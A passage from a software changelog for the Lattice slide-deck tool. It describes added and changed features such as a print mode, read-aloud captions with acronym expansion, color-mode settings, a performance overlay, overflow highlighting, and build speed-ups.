  bulk of the "FRAME"/"edit→paint" perf-overlay numbers). It now fingerprints
  everything baked outside the slide (theme, mode, size, author CSS) and, when that's
  unchanged, patches only the slide's content in the resident document — the browser
  keeps the parsed stylesheet and the running runtime, so a warm edit drops from
  ~485ms to ~2ms (measured, production dist, 4× CPU throttle). Any theme/mode/size
  change still does a full rewrite so the new styles take effect. This brings the
  single-slide preview in line with the multi-slide filmstrip, which already patched.
  Front B of `engineering/decisions/2026-07-11-preview-performance-diagnosis.md`.

### Added

- **Read-aloud diagnostics overlay — a first-class, draggable live readout for Present narration.**
  A twin of the performance overlay: toggle it in **Workspace → General → Diagnostics**
  ("Read-aloud diagnostics") or with `?readaloud-debug=1`, and while narrating a slide it shows the
  active voice/model, `AudioContext` state, sync (spoken sentences vs. track cues), cadence drift
  (how far the highlight ran ahead of the voice, peak), the reader-vs-audio clock, the narration
  source (projection vs. fallback), and a per-sentence `attempt`/`timing` trace with a **copy trace**
  button. It wears the same on-brand `popover` surface, 6-dot drag grip, status dots, and × as the
  perf overlay, is theme-aware (light/dark), portals to `<body>`, remembers its position, and is a
  true no-op when off. Born from the on-device hunt for the "skips words / races" regression; kept as
  a permanent QA aid for tuning voice + cadence on a real device (HARD RULE #23).

- **Print mode — a B&W-safe, ink-on-white render of the whole deck for paper handouts.**
  Every theme's palette encodes meaning in hue, which a grayscale office printer throws away;
  print mode swaps in a universal `--print-*` band so nothing depends on color. Turn it on
  three ways: the first-class **`color-mode: print`** front-matter key (also in the Studio's
  color-mode picker as "Print (B&W)"), the legacy `class: print`, or the new `lattice … --print`
  export flag (no source edit — it stamps the deck-wide `print` canvas class). What it does:
  remaps every main token to ink-on-white (surfaces, the 12-token type ramp, accent, status,
  the categorical + diagram ramps) via `section.print`; **every print text token clears WCAG
  AA against white** (gated in `test/unit/palette/contrast.test.js`); dark bookend covers
  become light framed ink instead of a toner-heavy flood; and category distinction rides on
  channels that survive gray — stepped lightness, a promoted border, and **hatch/dot/cross
  SVG pattern fills** for chart & diagram series (pie, funnel, Mermaid, gantt, kanban,
  journey, word-cloud, choropleth), reusing the a11y-achromatopsia texture set. Mermaid,
  which bakes its colors to literal hex offline, gets a dedicated print themeVars bake so its
  node text + edge lines ink correctly. Colour export is untouched — print is an explicit
  opt-in, never `@media print`. Demo: `examples/print-mode.md`. Design:
  `engineering/decisions/2026-06-14-deck-print-styling.md`.
- **`glossary: auto` — a deck writes its own glossary from the acronym registry.** The
  `acronyms:` front-matter carries an optional one-sentence `definition` per term (alongside
  the spoken `expansion`), which was parsed but never shown. Add `glossary: auto` to the front
  matter and Lattice appends a reference-appendix slide built from those definitions — reusing
  the shipped `glossary` component, so the term/definition table (with its auto A–Z range pill)
  ships on **every** surface: PDF, PPTX, the HTML player, and the live Studio. Terms are listed
  alphabetically; an acronym with only an expansion (no definition) is omitted. The exported
  `.html` manifest also gains a `glossary` term→definition projection for downstream tools. The
  generated slide is idempotent — it strips its own trigger, so a `.html` round-trip renders it
  once and never regenerates. Off by default (no `glossary:` key → byte-identical to today). Toggle it
  from the **deck-setup drawer** (a switch alongside Auto-split / Page numbers) or by hand in the front
  matter. See `engineering/decisions/2026-07-11-manifest-speech-contract.md` §18.
- **Present mode gains a segmented, section-grouped progress rail — one honest
  progress element replacing the old dual counter.** One segment per slide,
  grouped by the deck's `divider` slides with a centered section title
  above; the current segment fills as read-aloud plays, and clicking a segment
  jumps to it. Replaces the separate slide-position bar and read-aloud cue count
  that sat side by side. (Studio Present redesign — `engineering/decisions/2026-07-12-studio-present-redesign.md`, S1.)
- **Decks can opt into a "Struck" card elevation that works in both light and dark
  decks — and survives the PDF export.** Set `lift: on` in the front matter and card
  surfaces lift off the slide; per slide, `_class: lifted` lifts one slide in a flat
  deck and `_class: flat` drops one out of a lifted deck. **Off by default** —
  no existing deck changes unless it asks. A single shared `--elevation-card` token (a
  zero-blur box-shadow whose per-layer colours flip via CSS `light-dark()`) casts a
  crisp offset shadow on a light canvas and a 1px white rim-light on the top edge on a
  dark canvas — Material's "elevation is light from above", expressed as an edge
  highlight so the **card fill never changes**. Every
  layer is zero-blur, so it exports as pure vector (no soft-mask grey-box in Apple
  PDFKit / Skia). Applied across the whole card family — every component whose
  surface is a `bg-alt` tile with a hairline: `cards-grid`, `cards-stack`,
  `pricing` (composed under the featured tier's accent ring), `quote` (replacing a
  raw `rgba(0,0,0,.07)` literal), `kpi.ops`/`kpi.trajectory`, `stats` (given a real
  card surface, per its "tiles" manifest), plus `verdict-grid`, `matrix-2x2`,
  `decision`, `split-compare`, `redline`, `compare-prose`, `actors`, `inventory`
  (`.cards`), `list`, `statute-stack`, `citation-card`, `regulatory-update`,
  `authority-chain`, `list-steps`, `split-panel` (right-side cards only — the left
  rail stays flat), and the `contact` QR card. Ruled tables (`glossary`,
  `list-tabular`) and full-height rails are deliberately left flat. A companion
  `--elevation-berth` token insets each card grid from the stage's `overflow:clip`
  so shadows aren't sheared — applied as vertical-only `padding-block` (the shadow
  has no horizontal extent, and a horizontal inset would shear dense rows like a
  5-stat strip), never margin (HARD RULE #20). Demo:
  `examples/struck-elevation.md`; rationale:
  `engineering/decisions/2026-07-12-struck-elevation.md`.

- **The RENDER group gains a COALESCE row — how many edits the preview debounce
  folded into this render.** A fast typing burst lands many source changes inside
  the 140ms preview window, and the debounce collapses them into ONE engine
  render; COALESCE reports that fold factor (e.g. `26→1` after a burst, `1→1`
  when a single edit renders on its own). It reads the count DeckPreview stamps
  on the live host per paint — bound to that exact render, not a shared global an
  overlapping render could steal — so the overlay shows real work spared, each
  collapsed keystroke being ~38ms of main-thread time you didn't pay while
  typing. Docs-side only; a plain render still shows `1→1`.
- **The RENDER breakdown now shows deck context — why a render costs what it
  does.** Below the stage bars, chips report the heavy content the render
  carried: how many charts and Mermaid diagrams, whether the source has math,
  and whether the previewed slide overflows its box. All computed docs-side from
  the rendered HTML + source (chart-layout sections, `language-mermaid` fences,
  code-stripped math detection) and the live frame (overflow, read after it
  settles and patched onto the sample without re-timing the render). Chips show
  only when relevant, so a plain slide stays clean.
- **The performance overlay's RENDER row drills into a per-stage engine
  breakdown.** Tapping RENDER now shows *where the time went* — parse /
  transforms / assemble / css / other, with proportional bars — plus the slowest
  component transforms by name, so "render was slow" becomes "the chart transform
  was slow." The engine emits this only when asked (`opts.stats`, set solely
  while the overlay is subscribed): `render()` collects per-stage timings and a
  per-transform map, threaded through `lib/engine` + `lib/transformers` and the
  playground wrapper; the buckets reconcile to the raw `engineMs` (an `other`
  bucket carries the docs-side math prescan / cold-KaTeX cost). A normal render —
  CLI, export, or overlay-off — is byte-identical and pays nothing.
- **A "Data visualization" showcase in the Playground's gallery drawer — every chart
  and math component in one deck, and it can't go stale.** The docs-site Playground now
  offers a consolidated walk across all 13 chart components plus math (the exact surfaces
  the old-browser colour fallback covers), alongside the Jargon and Design-system
  showcases. Like the per-bucket family galleries it is **generated from the live manifest
  set** (`tools/build-showcase-galleries.js`), so adding a chart or math component makes it
  appear automatically on the next rebuild — a blocking gate
  (`test/unit/tools/showcase-galleries.test.js`) fails the build if the committed deck
  drifts from the manifests, or if its component set ever diverges from the colour
  fallback's scanned set. The generated deck (`examples/data-viz-gallery.md`) also doubles
  as the manual old-engine / smart-TV colour-fallback test artifact.
- **Captions Layer 1 — a per-slide `<!-- caption: -->` override, a front-matter `captions:`
  map, and a discovery lint — so you control exactly which words a slide narrates.** Building
  on the acronym registry (§15), narration now resolves a single precedence chain, highest
  first: a slide's inline `<!-- caption: … -->` (its exact read-as text, a new consumed comment
  channel beside `note:`/`describe:`) → a front-matter `captions:` entry for that slide (keyed
  by author slide number) → the speaker note → the component-aware DOM projection. The channel
  boundary lives once in `notes-core` so a `caption:` comment is never embedded as a PDF
  speaker note or read as one (the note still rides in the PDF; the caption is what the caption
  track speaks), and the front-matter block is parsed once in the shared resolver so the export
  and the live Present overlay can't drift. A front-matter caption keyed by slide number
  resolves correctly even under Present's `exec`/`onepager` reader lenses — it maps through the
  slide's ORIGINAL deck index, so a filtered/reordered view never binds a caption to the wrong
  slide. **`caption:` joins `note:`/`describe:` as a reserved comment prefix** — a comment that
  begins `caption:` is read as narration, not embedded as a PDF speaker note. `--captions` and
  `--strip-notes` compose: a caption is public-facing narration you opt into, so it is NOT removed
  by the private-note strip (ship captions without your notes; omit `--captions` for no caption
  track). New: a non-blocking `narration-acronyms` hint in `lint:deck` lists the multi-letter
  all-caps tokens a deck speaks letter-by-letter (expanded by neither the built-in lexicon nor
  your `acronyms:` registry, and not a common format initialism like `PDF`/`HTML`), so you learn
  what to register without ever playing audio. Demonstrated in `examples/read-along-captions.md`.
  Audio naturalness stays UNVERIFIED (no TTS in CI) — only the display→spoken string behavior is
  claimed.
- **The Studio now paints a real first slide instantly on a cold mobile load, instead
  of a blank page until the app hydrates.** `/studio` was a `client:only` island with an
  empty `<body>`, so on a phone the largest paint waited on React + CodeMirror hydration —
  a ~6s Largest-Contentful-Paint on the live-perf overlay. The page now server-renders an
  **instant shell** for a first-time visitor: the newcomer deck's title slide is rendered
  through the owned engine at build time to static HTML + its **critical CSS** (pruned from
  563KB to ~15KB gzipped via css-tree + jsdom), shown immediately with a server-rendered
  welcome banner, then dismissed the moment the live preview's first render lands (no blank
  gap, no layout shift — the slide scales by its own container queries). Measured against the
  production build (headless Chrome, CPU 4×/6× + Slow-4G): **LCP 1156/1751ms → 304/531ms**,
  now decoupled from device speed (it's a static element), turning the mobile LCP needle
  green. The engine bundle is no longer eager-warmed ahead of first paint. A **returning
  visitor** gets the same instant paint of **their own last slide**: on leaving the Studio
  it snapshots the live preview (the rendered slide HTML + just the CSS it uses, pulled
  from the iframe's CSSOM) to localStorage, and the pre-paint replay script paints that on
  the next visit — measured LCP **700ms (light) / 1267ms (dark)** on a returning mobile
  visit (was the same ~6s blank). The replayed snapshot is stamped with its own deck id
  and only paints when it matches the deck the app is about to boot, so a returning user
  never sees a brief flash of the wrong deck's last slide; the captured HTML is
  re-sanitized at the storage boundary and `@import` rules are dropped from the captured
  CSS. Front A of `engineering/decisions/2026-07-11-preview-performance-diagnosis.md`.
- **Captions get their own strip control and a Studio editor.** Two follow-ups to Layer 1:
  (1) a new **`--strip-captions`** export flag scrubs the read-as caption channel — inline
  `<!-- caption: -->` AND the front-matter `captions:` map — from the `.vtt` and the embedded
  source, ORTHOGONAL to `--strip-notes`. Notes (what you say) and captions (what a slide reads)
  are independent channels, so each strips on its own: `--strip-captions` alone falls those
  slides back to the note / auto projection; add `--strip-notes` too for a fully silent track.
  (A slide that had BOTH a caption and a note will then narrate the NOTE — the caption was
  masking it — so use both flags when the note is also private.) `describe:` accessibility text
  is deliberately NOT strippable — it's a screen-reader equivalent, not a private channel.
  Verified on the real `.vtt` and the PDF-embedded source. (2) The Studio's per-slide **"This
  slide" drawer now has a Caption field** in the Notes tab, beside the speaker note and the
  accessibility description — type the exact words a slide should read aloud and it writes the
  `<!-- caption: -->` comment (highest-precedence narration), never touching the presenter-note
  field. The in-overlay live composition is typecheck-only; the string behavior is unit-tested.
- **The exported `.html` player's Read·Slides view now matches Present's frame, with
  floating Home/End buttons and mouse-wheel navigation in Present.** Read·Slides used to
  size each slide to fill the full width (edge-to-edge, no breathing room) and clipped the
  first slide's bottom on a wide viewport — so switching between Present and Read·Slides
  jumped. Read·Slides now fits each slide to the **same footprint as Present** (≈86% of the
  visible height, 40px side inset), so the first slide is identical between the two tabs
  (seamless switch) and the next slide **peeks** below the fold — the "scroll for more" hint
  this control-free view needs. An **auto-revealing floating Home (↥) / End (↧) control**
  (the ubiquitous jump-to-top/bottom affordance) overlays the bottom-right corner — it
  reveals on scroll / touch / tap and idle-hides after ~1.5s, each button hiding when its edge
  is already reached, with safe-area insets and reduced-motion support — so the continuous
  scroll is never obstructed by a docked row. *(On mobile the reveal is driven by `touchstart`/
  `touchmove`, not just `scroll` — iOS / in-app WebKit coalesces the overflow container's scroll
  event during momentum, so a touch-drag would scroll the deck without ever surfacing the
  control; a plain tap now summons it too.)* And
  **Present now advances on the mouse wheel / trackpad** (one decisive notch = one slide,
  debounced) — the desktop analogue of swipe, alongside the existing ←/→ keys, buttons, and
  touch. Verified on the real player at desktop, tablet, and mobile widths.
- **A live performance overlay in the Studio — toggle it under Workspace →
  General → Diagnostics.** The overlay (off by default) gains a new **RENDER**
  group beside the existing Web Vitals and runtime rows, showing the live
  edit→preview pipeline for each render: **engine** (`PG.render` — markdown parse
  + component transforms + geometry), **sanitize** (the DOMPurify preview-frame
  pass), **frame** (the browser's srcdoc parse/layout), **fit** (the scale read),
  and the **total** edit→paint span, each color-rated against a budget, plus the
  source workload size. Timings are captured with a handful of `performance.now()`
  deltas in `single-slide-render.ts` (piggybacking the existing fit read — no
  added reflow) and published through a tiny dependency-free bus
  (`docs/src/playground/render-metrics.js`); the overlay subscribes only while
  shown, so with it off the render path does no telemetry work beyond a few
  `performance.now()` reads. Every row is **tappable for a plain-language
  explanation** — what it measures, why it matters, and where the value sits
  against its budget — via a shadcn **Popover** on tablet/desktop and a bottom
  **Sheet** on phones (the overlay is a React island; the metric copy + budgets
  live in one registry, `docs/src/components/site/perf-metrics.ts`). The compact
  panel and the detail cards share the same theme-aware surface, so the overlay
  is on-brand in both light and dark instead of a fixed dark HUD. Enable it from
  the Studio toggle (Workspace → General → Diagnostics), the Drawing Board
  switch, or the `?perf` URL param — all the same cross-surface pref. Design + the deferred deeper-instrumentation option:
  `engineering/decisions/2026-07-11-studio-render-perf-overlay.md`.
- **Read-aloud speaks everyday business shorthand instead of spelling it — `FY26`
  is "fiscal year twenty-six", not "F Y 26".** Cadenza's say-as lexicon gained a
  case-sensitive fiscal/calendar **period parser** (`FY26`/`FY2026`/`CY24`,
  `4Q24`/`Q3`/`Q3'26`, `1H26`/`H1`/`2H` → "fiscal year twenty-six", "fourth quarter
  fiscal twenty-four", "first half…") and a much broader **acronym dictionary** that
  **expands** initialisms to words (`ARR`→"annual recurring revenue",
  `KPI`→"key performance indicator", `API`→"application programming interface",
  `EPS`, `YTD`, `R&D`, `P&L`, …), says lexicalized ones as **words**
  (`EBITDA`→"ee bit dah", `CAGR`→"cagger", `GAAP`→"gap", `SaaS`→"sass"), and adds a
  **case-sensitive tier** so a token that also spells a word only expands in its
  acronym case (`COGS`→"cost of goods sold" but the lowercase word "cogs" is
  untouched; `CY`, `TAM`, `MoM`). Quarters now read as ordinals (`Q3`→"third
  quarter", previously "Q three"). Both the live Studio Present read-aloud and the
  CLI/export captions share the change (one normalizer). Audio itself is unverified
  (no TTS in CI) — only the spoken string is claimed.
- **A deck can teach read-aloud its own acronyms — `acronyms:` front-matter, and the
  built-in dictionary is now conservative so it's never confidently wrong in a
  boardroom.** A deck declares its vocabulary in front-matter (`acronyms: { CRO:
  chief revenue officer }`, or the object form with an optional `definition`); the
  author's pronunciations beat the built-in dictionary **and** every pattern
  (case-sensitive, whole-token), on both the live Present read-aloud and the exported
  `.vtt` (one shared parser, so they never diverge). To keep the deck-blind default
  safe, acronyms that flip meaning by industry **no longer auto-expand** — `CRO`,
  `CMO`, `LTV` (loan-to-value), `SMB` (Server Message Block), `MFA` (Master of Fine
  Arts), `CAC` (Common Access Card), `EPS` (Encapsulated PostScript), `SAM`, `SOM` —
  declare the one you mean via `acronyms:`. The always-on set is now scoped to what's
  unambiguous in a SaaS/tech-growth boardroom, enforced by a `KNOWN_BIMODAL` denylist
  test so re-adding a bimodal fails CI. Audio is unverified (no TTS in CI) — only the
  spoken string is claimed.
- **A first-class `color-mode:` front-matter key — `light` · `dark` · `system` ·
  `inherited` — that every surface honors.** Color mode was authored through the
  overloaded `class: dark`/`class: light` token axis; it now has a dedicated,
  typo-checkable key. `light`/`dark` **pin** the deck's canvas (document fidelity —
  it opens that way on every device); `system` **follows the viewer's OS**
  (`prefers-color-scheme`); `inherited` **adopts the host** — the website toggle in
  the Studio/Playground, the reader's OS in a shared file. The key resolves through
  one register (`lib/core/resolve-color-mode.js`) into the existing section-class →
  `color-scheme` → `light-dark()` machinery, so the engine, the runtime, the CLI
  emulator, and thus PDF/PPTX/PNG/HTML-player bytes all honor it; the Studio and
  Playground deck-settings drawers each expose a Color-mode control. A per-slide
  `<!-- _class: dark|light -->` still overrides one slide. The legacy `class: dark`/
  `class: light` keeps working as a **deprecated alias** (the linter nudges toward
  the key with a new `deprecated-class-color-mode` info finding; `unknown-color-mode`
  warns on a typo). Precedence: the deck's `color-mode:` is the default → a viewer's
  live toggle overrides their session → a per-slide `_class:` overrides that slide.
  See `engineering/decisions/2026-07-11-color-mode-frontmatter.md`.
- **Read-along captions now speak a checklist/matrix's state, which used to be
  silent — in each component's own words.** State markers (`[x]`/`[-]`/`[ ]`/`[/]`)
  render with the glyph removed and the meaning kept only in a CSS class, so
  narration used to read "Encryption at rest. SOC 2 audit." and drop the whole
  point. The export projection now recovers the state with a COMPONENT-KEYED
  register (the same class means different things per component): a checklist reads
  completion ("Encryption at rest: done. SOC 2 audit: to do."), a verdict grid /
  pricing table reads inclusion ("Speed: yes, Cost: no"), and an obligation matrix
  reads obligation status header-bound ("GDPR — Delete: applies; Portability:
  **exempt**" — never mis-narrated as "pending", the near-antonym a flat word map
  produced). The `heat` matrix variant only recolors, so it reads the same words.
  Third slice of the natural-narration plan
  (`engineering/decisions/2026-07-11-manifest-speech-contract.md` §6/§13 F-D);
  string behavior is unit-tested from real engine renders, audio UNVERIFIED.
- **Exported read-along captions (`.vtt`) now narrate a deck's slides even when it
  has no speaker notes — reading each component the way a person would.** Previously
  `--captions` wrote nothing for a note-free deck. An authored speaker note still
  wins per slide, but where a slide has none, a component-aware DOM speech
  projection narrates it: evidence components read label-first
  ("Total revenue: $2.4B", not "$2.4B, total revenue"), quotes read verbatim with
  their attribution, a `wifi`/`contact` ledger reads "Network: ACME-Guest", tables
  read header-bound when they have a header row, and a chart/diagram/math visual is
  skipped (heading + caption only, never SVG read aloud). Combined with the token
  normalizer above, a KPI tile speaks "Total revenue: two point four billion
  dollars, up nine percent." `--strip-notes` still suppresses captions entirely.
  (This improves the EXPORT; the on-screen Present read-along still narrates from
  markdown, so the two can differ for chart slides until a later slice unifies
  them.) Second slice of the natural-narration plan
  (`engineering/decisions/2026-07-11-manifest-speech-contract.md` §6 Phase 2);
  string/structure behavior is unit-tested, audio on the Kokoro voice is UNVERIFIED.
- **The exported `.html` player now respects the color mode it was authored in —
  and Share → Webpage lets you choose light, dark, or system.** A shared deck is a
  document: it should open the way the sender made it, the way a PDF does. The
  export now bakes the authored mode as a `data-lp-scheme` attribute on `<html>`,
  and the player opens in it. **Light** and **dark** are pinned — the deck opens
  that way on every device, regardless of the receiver's OS setting. **System**
  is the explicit choice to defer to the receiver: the deck follows their OS
  light/dark preference (via a `prefers-color-scheme` media query). The in-player
  toggle still lets any viewer flip the mode for themselves — it overrides the
  view without changing how the deck was exported. From the CLI, the authored mode
  is read from the deck's effective `color-scheme` (a `*-dark` theme → dark; a
  `color-scheme: light dark` declaration → system; otherwise light); from the
  Studio, a light/dark/system selector on the Webpage export step defaults to the
  mode you're previewing. This keeps the older-WebKit fix intact — the dark values
  are still resolved to literal, plain-attribute-selector CSS with no reliance on
  the `light-dark()` function.
- **Read-along/TTS captions now speak units, signed deltas, section references,
  and a data-driven pronunciation lexicon — instead of raw glyphs.** Cadenza's
  display→spoken normalizer (`toSpoken`/`toSpokenText`) gained: signed deltas
  gated on a delta unit (`+9%` → "up nine percent", `−18d`/`-18d` → "down
  eighteen days" — both minus glyphs alike; a bare `+44`/`−40` stays a plain sign,
  not up/down), finance units with singular/plural agreement (`2pp` →
  "percentage points", `25bps` → "basis points", `4.2×` → "times", `18d` →
  "days"), section references preserving every citation digit (`§1798.100` keeps
  its trailing zeros, no longer a dropped glyph), the `·` middot dropped, and a
  layered, extensible pronunciation lexicon (`lexicon.ts`) — a domain-unambiguous
  BASE plus opt-in `legal`/`finance` domain packs (`toSpoken(tok, { domains:
  ['legal'] })`) so a deck can pronounce `v.` → "versus", `U.S.C.` → "U S C"
  without an engine change. First slice of the natural-narration plan
  (`engineering/decisions/2026-07-11-manifest-speech-contract.md` §6 Phase 1);
  string behavior is unit-tested, audio realization on the Kokoro voice remains
  UNVERIFIED (no TTS in CI).
- **A "Fix Me" overlay pinpointing the cause of an overflowing slide, drilled
  down to the specific offending element where it can prove one.** The
  existing "Overflows" ring/tag only ever named the SLIDE, never the culprit.
  When a `.cell-stage` / `.panel-right` / `.compare-right` clip cell genuinely
  clips its own content — a geometrically certain cause, unlike a grow-to-fit
  grid card that merely grew and pushed a neighbor past the frame (that
  misattribution was tried and dropped previously) — a yellow outline + "Fix
  Me" corner tag highlights it. When that cell holds a repeated-item
  collection (cards-grid's cards, split-compare's two options, …) whose items
  are stretched to a shared row height, it narrows further to the specific
  item whose own content-fill ("slack") is a genuine outlier below its
  row-mates — never the innocent neighbor merely stretched to match — falling
  back to the whole cell when no such outlier exists rather than guessing.
  Backed by a new `density.domSelector` manifest field (for the handful of
  components whose own transform retags the rendered axis elements) and a
  render-verified coverage test across all 26 `density.axis`-bearing
  components, which caught and fixed a pre-existing bug along the way:
  `_focus: item N` silently no-op'd on `split-panel` slides because the DOM
  finder only ever checked `.cell-stage`, never `.panel-right`. Preview-only
  throughout (never in an exported PDF/PPTX/HTML), drawn as a zero-flow
  overlay layer so it can never shift `nth-child` indices or corrupt
  Fit-Spine measurement. See `lib/helpers/overflow/overflow.docs.md` and
  `engineering/decisions/2026-07-10-overflow-cause-highlighting.md`.

- **The Fix-Me overlay's deferred follow-up: a "Likely fix" density-budget
  fallback for slides that overflow with NO clip-cell at all.** Some layouts
  (`kanban`, `timeline-list`, or any component under `form: off`/`no-form`)
  never get wrapped in a bounded clip cell, so a genuine grow-to-fit-push
  overflow on those slides gave the clip-cell signal nothing to point at.
  When a section overflows with zero clip-cell spill, the overlay now falls
  back to the component's own `density.soft`/`density.hard` word budget and
  highlights whichever item in its repeated-item collection has the highest
  live word count past `hard` — measured off the rendered DOM directly
  (never the markdown source, which the runtime doesn't have in a live
  preview), excluding the shared `.chart-status` pill class so an optional
  status badge can't skew which item ranks worst. Labeled "Likely fix" (a
  tooltip carries the word count) — deliberately never Case A's unhedged
  "Fix Me," since this is an editorial guess, not a geometric certainty. See
  `engineering/decisions/2026-07-10-overflow-cause-highlighting.md` §12.

- **A "Send feedback" entry point in the Studio topbar and the sitewide
  header.** Opens a sheet (category, one-line summary, details) and hands
  off to a pre-filled GitHub issue against `.github/ISSUE_TEMPLATE/studio-feedback.yml`
  — the user reviews and submits it under their own GitHub account, so the
  static, tokenless docs-site bundle never needs to hold a credential capable
  of creating issues. Auto-captures page, viewport, browser, and (in Studio)
  the open deck + theme as diagnostic context. See
  `docs/src/lib/feedback-issue.ts` and `docs/src/components/site/FeedbackSheet.tsx`.

### Changed

- **Studio Present read-aloud now speaks the same component-aware narration the
  exported captions do — a deck no longer sounds different live vs. exported.**
  Live Present used to narrate a slide by flattening its raw Markdown, while the
  export narrates the rendered, component-aware DOM — so the same KPI tile read
  "…dollars. Total revenue." live but "Total revenue: … dollars" in the exported
  `.vtt`, a hidden pull-quote gloss was spoken live but not exported, and a QR
  code's URL was read live but stripped in the DOM. Present now runs the SAME
  shared projection (`projectDeckToSpeech`) against its live slide DOM, so live and
  export draw narration from one source of truth (label-first metrics, hidden-gloss
  handling, stripped URLs all match). An authored speaker note still wins, and a
  recognized chart keeps its richer computed-facts narrator on both surfaces; the
  projection is precomputed on open (async, with the old Markdown flatten as the
  instant fallback until it lands). Charts in the EXPORT are still narrated from the
  visual-skipping projection — bringing the chart narrators to the export for full
  parity is tracked as a follow-up. Live audio remains UNVERIFIED (no TTS in CI);
  only the spoken text is claimed.

- **Canonical docs no longer frame Lattice as fundamentally "Marp emulation."**
  Closes out most of the Marp-legacy audit's §6 doc-framing backlog.
  `architecture.md`'s opening reframed from "Why Marp emulation, not Marp
  itself" to "Why the owned engine, not a Marp CLI wrapper"; the LFM spec's
  "Lattice is a Marp-based engine" corrected to name the native
  re-implementation; `cascade.md` and `marp-independence.md`'s seemingly
  contradicting `!important`-scaffold claims reconciled (both true, scoped
  to different render paths); `engineering/pipeline.md`'s ~400 obsolete
  pre-engine lines replaced with an accurate operational how-to; 7 test
  files' phantom "marp-cli third render path" comments corrected. §5(b) of
  the audit (retire marp-vscode preview support?) decided against — it
  works, stays first-party-supported. See
  `engineering/decisions/2026-07-10-marp-audit-doc-framing.md`.
- **The "Two-renderer rule" is now opt-in, not mandatory.**
  `engineering/workflow.md`'s contributor policy used to require every
  authoring transform to be duplicated in `lattice-runtime.js` (the DOM
  mirror that serves the vscode Marp preview) forever, regardless of whether
  any author needed it there. New transforms now ship against the owned
  `lib/engine` by default; a runtime mirror is added only when it's actually
  needed, with a comment naming its sunset condition. No existing mirrors
  were removed. Manually wiring `dist/lattice-runtime.js` + `dist/lattice.css`
  + a registered theme + front matter into VS Code's Marp extension (or any
  Marp tool) — the README.md "Embed in a browser" recipe — is unaffected and
  keeps working regardless. When a transform ships without a mirror it would
  have needed, log it in `engineering/gotchas.md`'s new "Known preview gaps"
  register — the only safeguard against the opt-in policy silently rotting
  the preview experience, since nothing automated catches a skipped mirror.
  See `engineering/decisions/2026-07-09-marp-legacy-audit.md` §5(a) for the
  reasoning — this was the one *regenerative* source of Marp-legacy coupling
  the audit found.
- **HARD RULE #12 (the theme-CSS `:not(:has(…))`/`:is(:has(…))` ban) is
  retired.** It existed on the claim that these selector forms silently
  broke in the "Marp for VS Code" extension's webview Chromium. Re-tested
  empirically against a real, current Chromium build: both forms behave
  exactly per spec, and no corroborating bug report was found anywhere.
  The gate's own "verify across all Marp/Electron versions" condition had
  never actually been checked since it was written. See
  `engineering/decisions/2026-07-10-hard-rule-12-retirement.md`.
- **Package description/keywords no longer frame Lattice as "a Marp-based
  slide deck system."** Lattice's own engine (`lib/engine/`) is a native
  Marpit re-implementation with zero `@marp-team` runtime dependency; Marp
  export (`export:marp`) is a named capability, not the framing. See
  `engineering/decisions/2026-07-09-marp-legacy-audit.md` for the full audit
  this came out of and `engineering/marp-independence.md`'s new Cost item 3
  (the vscode Marp preview-compatibility tax, previously undocumented).
- **`npm run build` / `build:check` runs ~24% faster.** `build-cadenza-lib.js`
  and `build-vetrina-lib.js` (two non-incremental `tsc --emitDeclarationOnly`
  passes, ~37% of the total wall time, with no ordering dependency on
  anything except `build-read-along-core.js`) now run in the background
  while the rest of the pipeline's steps run serially as before;
  `tools/build.js` joins on them right before the one step that actually
  needs Cadenza's `dist/` on disk. Measured locally: ~4.35s → ~3.28s for
  `build:check`, deterministic output, no log interleaving (background-step
  output is buffered and flushed prefixed with its step label, not
  `stdio: inherit`'d live). Found by a red-team/inversion/independent-checker
  performance audit; see `engineering/decisions/2026-07-10-landing-perf-katex-defer.md`.
- **Studio/Workbench/Playground's cold-load resolves the module graph in one
  parallel burst instead of ~6 sequential network round-trips.** Neither
  Vite nor Astro can auto-preload a `client:only`/`client:load` island's
  transitive dependency chunks (dynamic `import()` hides the graph from
  static analysis) — a real unthrottled trace of a cold Studio load showed
  the ~45-chunk dependency graph resolving one BFS depth-level at a time.
  A new build step (`docs/astro.config.mjs`'s `chunkGraphPlugin` +
  `docs/scripts/inject-modulepreload.mjs`) reads Rollup's own per-chunk
  `imports` graph after `astro build` and injects `<link rel=modulepreload>`
  for each app island's full transitive STATIC-import set (never
  `dynamicImports` — those stay intentionally lazy, e.g. Fabricate's
  `React.lazy` tab, except Studio's lint-kernel chunk, explicitly
  allowlisted since it loads automatically on every real mount, not gated
  by user action) into the built page, with an end-to-end integrity check
  (every injected href must resolve to a real file in `dist/`) so a future
  Astro/Vite/Rollup change that silently alters chunk shape fails the build
  loudly instead of shipping a broken hint. Measured: median time-to-mount
  1823ms → 1496ms (~18%) under a simulated 40ms-RTT connection, real
  browser, A/B same build — a simulated, not a real-device, measurement
  (HARD RULE #23); the nightly perf-regression watch (already wired into
  `perf-collect.mjs`'s build) continues validating this in CI going forward.
  Found by the same red-team/inversion/independent-checker audit above,
  which also disproved the original Lighthouse-mobile 8.5s LCP diagnosis (it
  was measuring a first-run-only welcome banner returning users never see)
  before landing on this fix, and a SECOND full red-team/inversion/
  independent-checker pass against the shipped diff itself (20 findings,
  all confirmed/partially-confirmed) that caught the lint-kernel gap and the
  integrity-check gap above. A new nightly workflow
  (`modulepreload-coverage-nightly.yml` + `docs/scripts/
  check-modulepreload-coverage.mjs`, `npm run check:modulepreload-coverage`)
  now covers the one remaining gap the integrity check can't: a FUTURE
  `client:only` page added without a matching `ENTRIES` entry. Same
  open-or-append rolling-issue shape as the existing perf-nightly watch —
  advisory, not a build gate, since a missing entry is a missed
  optimization, not a broken build; see
  `engineering/decisions/2026-07-10-landing-perf-katex-defer.md`.
- **Every docs-site call site now renders through one shared choke point,
  `docs/src/lib/render-engine.ts`'s `renderMarkdown()`.** Internal-only, no
  render output change: `single-slide-render.ts`, `playground-engine.ts`,
  `theme-studio.js`, `component-studio.js`, and `share-export.ts` (its
  `buildDeckRender`/`shareHtmlPlayer`/`shareCaptions`) previously each called
  `window.LatticePlayground.render()` directly. Prep work for the KaTeX
  bundle-weight deferral logged in
  `engineering/decisions/2026-07-10-landing-perf-katex-defer.md` §4 — the
  future lazy-load gate becomes one edit inside `renderMarkdown()` instead of
  seven repeated call-site edits. The two Drawing Board call sites
  (`drawing-board-render.js`, frozen — see
  `engineering/decisions/2026-07-03-studio-succession.md`) are unchanged, per
  the freeze. `share-export.ts` also drops a locally-duplicated `PG` type in
  favor of the canonical `LatticePlaygroundEngine`
  (`playground-global.d.ts`).
- **KaTeX no longer ships unconditionally in the docs-site engine bundle —
  closes out §4 of the perf audit.** `lattice-playground.js` used to bundle
